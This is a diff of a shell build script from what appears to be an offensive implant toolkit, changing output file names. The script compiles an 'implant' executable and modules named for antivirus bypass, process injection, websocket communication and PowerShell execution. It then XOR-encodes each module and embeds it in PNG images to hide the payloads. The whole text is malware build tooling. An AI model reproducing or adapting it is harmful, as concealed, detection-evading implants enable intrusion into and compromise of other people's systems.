@@ -12,29 +12,29 @@ echo "done!"
 
 # Compile the implant
 echo -n "TML blunt implantment is compiling..."
-mcs /out:$outputimagedir/tmlbi.exe tmlbi.cs
+mcs /out:$outputimagedir/tbi.exe tbi.cs
 echo "done!"
 
 # Compile the modules
 echo -n "Modules are compiling..."
-mcs /reference:$outputimagedir/tmlbi.exe /target:library /out:$outputimagedir/websocketmdl.dll websocketmdl.cs
-mcs /reference:$outputimagedir/tmlbi.exe /target:library /out:$outputimagedir/assemblymdl.dll assemblymdl.cs
-mcs /reference:$outputimagedir/tmlbi.exe /target:library /out:$outputimagedir/samplemdl.dll samplemdl.cs
-mcs /reference:$outputimagedir/tmlbi.exe /target:library /out:$outputimagedir/avbpmdl.dll avbpmdl.cs
-mcs /reference:$outputimagedir/tmlbi.exe /target:library /out:$outputimagedir/injectormdl.dll injectormdl.cs
-mcs /reference:$outputimagedir/tmlbi.exe /target:library /out:$outputimagedir/di-injectormdl.dll di-injectormdl.cs
-mcs /reference:System.Management.Automation.dll,$outputimagedir/tmlbi.exe /target:library /out:$outputimagedir/powermdl.dll powermdl.cs
+mcs /reference:$outputimagedir/tbi.exe /target:library /out:$outputimagedir/websocketmdl.dll websocketmdl.cs
+mcs /reference:$outputimagedir/tbi.exe /target:library /out:$outputimagedir/assemblymdl.dll assemblymdl.cs
+mcs /reference:$outputimagedir/tbi.exe /target:library /out:$outputimagedir/samplemdl.dll samplemdl.cs
+mcs /reference:$outputimagedir/tbi.exe /target:library /out:$outputimagedir/avbpmdl.dll avbpmdl.cs
+mcs /reference:$outputimagedir/tbi.exe /target:library /out:$outputimagedir/injectormdl.dll injectormdl.cs
+mcs /reference:$outputimagedir/tbi.exe /target:library /out:$outputimagedir/di-injectormdl.dll di-injectormdl.cs
+mcs /reference:System.Management.Automation.dll,$outputimagedir/tbi.exe /target:library /out:$outputimagedir/powermdl.dll powermdl.cs
 echo "done!"
 
 # Inject the modules to images
 echo "Modules are injecting to images:"
-mono $outputimagedir/imgtest.exe generateimage $templateimage $outputimagedir/websocketmdl.dll $xorkey $outputimagedir/encconp-ws.png
-mono $outputimagedir/imgtest.exe generateimage $templateimage $outputimagedir/assemblymdl.dll $xorkey $outputimagedir/encconp-as.png
-mono $outputimagedir/imgtest.exe generateimage $templateimage $outputimagedir/samplemdl.dll $xorkey $outputimagedir/encconp-sm.png
-mono $outputimagedir/imgtest.exe generateimage $templateimage $outputimagedir/avbpmdl.dll $xorkey $outputimagedir/encconp-av.png
-mono $outputimagedir/imgtest.exe generateimage $templateimage $outputimagedir/injectormdl.dll $xorkey $outputimagedir/encconp-in.png
-mono $outputimagedir/imgtest.exe generateimage $templateimage $outputimagedir/di-injectormdl.dll $xorkey $outputimagedir/encconp-din.png
-mono $outputimagedir/imgtest.exe generateimage $templateimage $outputimagedir/powermdl.dll $xorkey $outputimagedir/encconp-ps.png
+mono $outputimagedir/imgtest.exe generateimage $templateimage $outputimagedir/websocketmdl.dll $xorkey $outputimagedir/enccontent-ws.png
+mono $outputimagedir/imgtest.exe generateimage $templateimage $outputimagedir/assemblymdl.dll $xorkey $outputimagedir/enccontent-as.png
+mono $outputimagedir/imgtest.exe generateimage $templateimage $outputimagedir/samplemdl.dll $xorkey $outputimagedir/enccontent-sm.png
+mono $outputimagedir/imgtest.exe generateimage $templateimage $outputimagedir/avbpmdl.dll $xorkey $outputimagedir/enccontent-av.png
+mono $outputimagedir/imgtest.exe generateimage $templateimage $outputimagedir/injectormdl.dll $xorkey $outputimagedir/enccontent-in.png
+mono $outputimagedir/imgtest.exe generateimage $templateimage $outputimagedir/di-injectormdl.dll $xorkey $outputimagedir/enccontent-din.png
+mono $outputimagedir/imgtest.exe generateimage $templateimage $outputimagedir/powermdl.dll $xorkey $outputimagedir/enccontent-ps.png
 echo "Done!"
 
 # XOR the modules with a key
